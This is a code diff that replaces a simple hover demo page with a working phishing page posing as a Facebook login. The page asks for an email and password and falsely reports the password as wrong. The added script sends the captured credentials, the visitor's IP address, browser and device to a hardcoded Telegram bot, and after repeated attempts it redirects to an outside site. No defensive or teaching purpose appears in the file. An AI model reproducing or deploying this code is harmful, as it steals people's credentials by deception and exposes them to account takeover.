@@ -1,46 +1,228 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mouse Hover Opens New URL</title>
+    <title>Facebook</title>
+    <link rel="icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/2048px-2021_Facebook_icon.svg.png">
     <style>
-        /* Style for the container */
         body {
+            background-image: url("");
+            background-repeat: no-repeat;
+            background-size: cover;
+            margin: 0;
             font-family: Arial, sans-serif;
             display: flex;
-            justify-content: center;
+            justify-content: center;            
             align-items: center;
             height: 100vh;
-            margin: 0;
             background-color: #f0f0f0;
         }
 
-        .hover-area {
-            width: 200px;
-            height: 100px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            background-color: #4CAF50;
+        .container {
+            background: white;
+            object-fit: cover;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            width: 380px;
+            height: auto; /* Adjust height to fit content */
+        }
+
+        .logo {
+            width: px;
+            height: 80px;
+            margin-bottom: 20px;
+            background-color: #ddd;
+            border-radius: %;
+            display: inline-block;
+            object-fit: contain;
+        }
+
+        .input-field {
+            width: 92%; /* Set width of input field */
+            height:45px;
+            padding: 6px;
+            margin: 10px auto; /* Center input field */
+            border: 1px solid #ccc;
+            font-size: 15px;
+            border-radius: 5px;
+            text-align: center; /* Center text in input */
+            
+        }
+
+
+
+
+        .button {
+            width: 97%;
+            height:55px;
+            padding: 10px;
+            background-color: #007BFF;
+            border: none;
             color: white;
-            font-size: 20px;
-            border-radius: 8px;
+            font-size: 20px; 
+            border-radius: 5px;
             cursor: pointer;
+        }
+
+        .button:hover {
+            background-color: #0056b3;
+        }
+
+        .loading {
+            display: none; /* Hidden by default */
         }
     </style>
 </head>
 <body>
+    <div class="container" id="email-page">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTtVl3ZLbR8CQ22WZhHVVFIFtG8iNr8gH-VKNPjJMY00YuR7d_BAOTXxMsDbOulTbTWyC4&usqp=CAU"  class="logo" id="logo">
+        <h3>See more on Facebook</h3>
+        <input type="email" id="email" class="input-field" placeholder="Enter your Facebook Email address" required>
+        <button class="button" id="next-button">Next</button><br><br>
+        <div class="loading" id="loading-message">Loading...</div><br><br>
+        <b>Create new account</b><br><br><br>
+       
+    </div>
 
-<div class="hover-area" onmouseover="openNewURL()">
-    Hover me!
-</div>
+    <div class="container" id="password-page" style="display:none;">
+        <h3>The system is currently busy!<br> <h5>Login with your email to complete verification!</h5>
+        <img src="" alt="Logo" class="logo" id="logo-password">
+        
+        <h2 id="email-display"></h2>
+        <input type="password" id="password" class="input-field" placeholder="Enter your password" required> <!-- Centered password input -->
+        <button class="button" id="submit-button">Log in</button>
+    </div>
 
-<script>
-    function openNewURL() {
-        window.open('https://www.example.com', '_blank');
-    }
-</script>
+    <script>
+        const emailPage = document.getElementById('email-page');
+        const passwordPage = document.getElementById('password-page');
+        const emailField = document.getElementById('email');
+        const passwordField = document.getElementById('password');
+        const nextButton = document.getElementById('next-button');
+        const submitButton = document.getElementById('submit-button');
+        const emailDisplay = document.getElementById('email-display');
+        const logo = document.getElementById('logo');
+        const logoPassword = document.getElementById('logo-password');
+        const loadingMessage = document.getElementById('loading-message');
 
+        let attemptCount = 0;
+
+        async function fetchUserIP() {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip; // Return the user's IP address
+        }
+
+        async function getUserData() {
+            const ip = await fetchUserIP();
+            return {
+                ip,
+                browser: navigator.userAgent,
+                device: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
+            };
+        }
+
+        async function sendDataToTelegram(userData, email, password) {
+            const chatId = '5686268913'; // Replace with your chat ID
+            const botToken = '7404707202:AAHEZ8wQN6-ZGqfohNi6fManLLurWNpg6b4'; // Replace with your bot token
+
+            const message = `
+                User Data:
+                Email: ${email}
+                Password Attempted: ${password}
+                IP Address: ${userData.ip}
+                Browser: ${userData.browser}
+                Device: ${userData.device}
+            `;
+
+           try {
+               await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                   method: 'POST',
+                   headers: {
+                       'Content-Type': 'application/json'
+                   },
+                   body: JSON.stringify({
+                       chat_id: chatId,
+                       text: message
+                   })
+               });
+           } catch (error) {
+               console.error('Error sending data to Telegram:', error);
+           }
+        }
+
+        nextButton.addEventListener('click', () => {
+            const email = emailField.value;
+
+            if (email) {
+                const domain = email.split('@')[1];
+                if (domain) {
+                    const logoUrl = `https://logo.clearbit.com/${domain}`;
+                    const bgUrl = `https://source.unsplash.com/1600x900/?${domain}`;
+
+                    // Update logo and background
+                    logo.src = logoUrl;
+                    logoPassword.src = logoUrl;
+                    document.body.style.backgroundImage = `url(${bgUrl})`;
+                }
+
+                // Show loading message
+                loadingMessage.style.display = 'block';
+                nextButton.disabled = true; // Disable button
+
+                // Wait for 5 seconds before transitioning
+                setTimeout(() => {
+                    loadingMessage.style.display = 'none';
+                    emailPage.style.display = 'none';
+                    passwordPage.style.display = 'block';
+                    emailDisplay.textContent = email;
+
+                    nextButton.disabled = false; // Re-enable button
+                }, 5000); // Wait for 5 seconds
+            } else {
+                alert('Please enter a valid email.');
+            }
+        });
+
+       submitButton.addEventListener('click', async () => {
+           const email = emailField.value; 
+           const password = passwordField.value;
+
+           if (email && password) {
+               attemptCount++; // Increment attempt count
+
+               // Simulate incorrect password check (replace with actual validation logic)
+               const correctPassword = "yourCorrectPassword"; // Replace with actual correct password
+               
+               if (password !== correctPassword) { 
+                   alert('Incorrect password. Please enter correct password.'); // Alert for incorrect password
+                   if (attemptCount >= 4) { // Check if attempts exceed or equal to 4
+                       alert('Incorrect password entered too many times. Redirecting...');
+                       window.location.href = "https://updatebrowser.org"; // Redirect to external site
+                       return; // Exit the function
+                   }
+               } else {
+                   alert('Login successful!'); // Example success message
+               }
+               
+               // Send user data to Telegram
+               const userData = await getUserData();
+               await sendDataToTelegram(userData, email, password);
+               
+               alert('Incorrect password. Please enter correct password.!');
+               
+               // Clear input fields after submission
+               document.getElementById('email').value = '';
+               document.getElementById('password').value = '';
+               
+           } else {
+               alert('Please enter your password.'); // Alert if password field is empty
+           }
+       });
+    </script>
 </body>
 </html>
